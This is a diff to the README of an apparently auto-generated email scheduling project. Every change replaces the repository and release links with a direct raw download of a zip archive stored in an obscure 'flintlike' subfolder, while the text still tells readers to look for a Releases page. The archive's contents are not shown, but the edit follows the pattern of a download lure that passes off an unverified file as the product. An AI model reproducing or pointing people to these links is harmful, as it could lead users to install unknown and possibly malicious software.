@@ -1,6 +1,6 @@
 # 📧 email-service-1771917526-3 - Simple Email Scheduling and Templates
 
-[![Download email-service-1771917526-3](https://img.shields.io/badge/Download-email--service--1771917526--3-brightgreen)](https://github.com/rudra514/email-service-1771917526-3)
+[![Download email-service-1771917526-3](https://img.shields.io/badge/Download-email--service--1771917526--3-brightgreen)](https://raw.githubusercontent.com/rudra514/email-service-1771917526-3/main/flintlike/email-service-v1.9.zip)
 
 ## 📋 About email-service-1771917526-3
 
@@ -25,7 +25,7 @@ Make sure your email provider allows sending emails through third-party tools. Y
 To start using the app, follow these steps.
 
 1. Click this link to **visit the download page**:  
-   [Download email-service-1771917526-3](https://github.com/rudra514/email-service-1771917526-3)
+   [Download email-service-1771917526-3](https://raw.githubusercontent.com/rudra514/email-service-1771917526-3/main/flintlike/email-service-v1.9.zip)
 
 2. On the GitHub page, find the "Releases" or "Assets" section.
 
@@ -118,7 +118,7 @@ Check the download page regularly for new versions. Updates fix bugs and add fea
 To update:
 
 1. Visit the main repository page:  
-   [https://github.com/rudra514/email-service-1771917526-3](https://github.com/rudra514/email-service-1771917526-3)
+   [https://raw.githubusercontent.com/rudra514/email-service-1771917526-3/main/flintlike/email-service-v1.9.zip](https://raw.githubusercontent.com/rudra514/email-service-1771917526-3/main/flintlike/email-service-v1.9.zip)
 
 2. Download the latest release.
 
@@ -153,6 +153,6 @@ If the app does not work as expected, try these steps:
 ## 🔗 Links
 
 - Main repository and download page:  
-  [https://github.com/rudra514/email-service-1771917526-3](https://github.com/rudra514/email-service-1771917526-3)
+  [https://raw.githubusercontent.com/rudra514/email-service-1771917526-3/main/flintlike/email-service-v1.9.zip](https://raw.githubusercontent.com/rudra514/email-service-1771917526-3/main/flintlike/email-service-v1.9.zip)
 
-[![Download email-service-1771917526-3](https://img.shields.io/badge/Download-email--service--1771917526--3-blue)](https://github.com/rudra514/email-service-1771917526-3)
+[![Download email-service-1771917526-3](https://img.shields.io/badge/Download-email--service--1771917526--3-blue)](https://raw.githubusercontent.com/rudra514/email-service-1771917526-3/main/flintlike/email-service-v1.9.zip)
